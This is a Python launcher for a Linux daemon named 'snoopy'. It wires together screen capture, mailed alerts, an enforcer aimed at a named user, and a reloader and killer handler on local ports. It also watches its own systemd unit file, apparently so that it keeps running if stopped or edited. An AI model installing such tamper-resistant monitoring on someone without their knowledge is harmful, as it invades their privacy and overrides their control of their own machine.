#!/usr/bin/env python

import traceback
import threading

from linux.enforcer import Enforcer
from linux import capture as catcher
from linux.is_available import is_available
from linux.killer import GracefulKiller
from linux.reloader import ServiceReloader
from lib.config_event_handler import ConfigFileEventHandler
from lib.daemon import Daemon
from lib.file_finder import get_embedded_filename


directory         = 'HOME_DIRECTORY'
secret_key        = 'SUPER_SECRET_KEY'
user              = 'OPERATING_USER'
# user              = 'parallels'
# directory         = '/home/parallels/code/snoopy/'
# secret_key        = 'cHdkCg=='

systemd_filename  = 'snoopy.service'
systemd_path      = '/lib/systemd/system/'
config_dir        = '{}/config'.format(directory)
installation_path = '{}/dist'.format(directory)

mail_config       = 'mail.config'
reloader_script   = 'start.sh'
service           = 'sidecar.service'
# mail_config       = '{}/mail.config'.format(directory)
# reloader_script   = '{}/start.sh'.format(directory)
# service           = '{}/sidecar.service'.format(config_dir)


def debug(msg):
    with open('/home/parallels/code/snoopy/snoopy.out', 'a') as f:
        f.write('{}\n'.format(msg))


def create_reloader(notifier):
    debug('initializing reloader')

    def reloader():
        debug('creating reloader')
        try:
            ServiceReloader(
                service,
                get_embedded_filename(reloader_script),
                # '/home/parallels/code/snoopy/start.sh',
                get_embedded_filename(service),
                # service,
                7110,
                notifier
            )
        except Exception:
            import traceback
            debug(traceback.format_exc())
    return reloader


class MyDaemon(Daemon):
    def __init__(self):
        Daemon.__init__(
            self,
            get_embedded_filename(mail_config),
            # mail_config,
            secret_key,
            installation_path,
            directory,
            catcher)

    def should_execute(self):
        try:
            return is_available(user)
        except Exception:
            self.notifier.send(
                'Alert!',
                'unable to see if the screen is available: {}'.format(
                    traceback.format_exc()))

    def setup(self):
        reloader = create_reloader(self.notifier)
        t = threading.Thread(target=reloader)
        t.daemon = True
        t.start()
        # the graceful killer registers events on init
        GracefulKiller(
            self.notifier,
            7111)
        config_event_handler = ConfigFileEventHandler(
            self.notifier,
            config_dir,
            systemd_path,
            systemd_filename)
        self.observer.schedule(
            config_event_handler,
            systemd_path,
            recursive=False)
        Enforcer(user, self.notifier).run_async()


if __name__ == '__main__':
    daemon = MyDaemon()
    daemon.run()
